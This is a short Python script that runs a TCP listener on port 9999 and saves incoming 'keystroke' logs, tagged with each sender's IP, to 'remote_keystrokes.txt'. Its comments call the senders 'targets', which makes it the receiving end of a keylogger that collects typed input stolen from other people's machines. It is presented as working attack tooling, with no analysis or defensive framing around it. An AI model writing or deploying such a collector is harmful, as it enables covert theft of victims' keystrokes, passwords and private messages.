
import socket

# Configuration
PORT = 9999
OUTPUT_FILE = "remote_keystrokes.txt" # file to store received log with target IP

# Setup server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", PORT)) # listens on all interfaces at port 9999
server.listen(1) # waits for 1 connection
print("Server listening...")

# Receive and save log file with target IP
while True:
    client, addr = server.accept() # accepts connection, addr includes target's IP
    target_ip = addr[0] # extracts target's IP address from addr tuple
    data = client.recv(4096).decode() # receives log file contents
    if data:
        log_entry = f"Target IP: {target_ip}\n{data}\n\n" # formats entry with IP
        print(f"Received from {target_ip}:\n{data}") # shows received data with IP
        with open(OUTPUT_FILE, "a") as f: # appends to file on my device
            f.write(log_entry) # writes IP and log data
    client.close() # closes connection
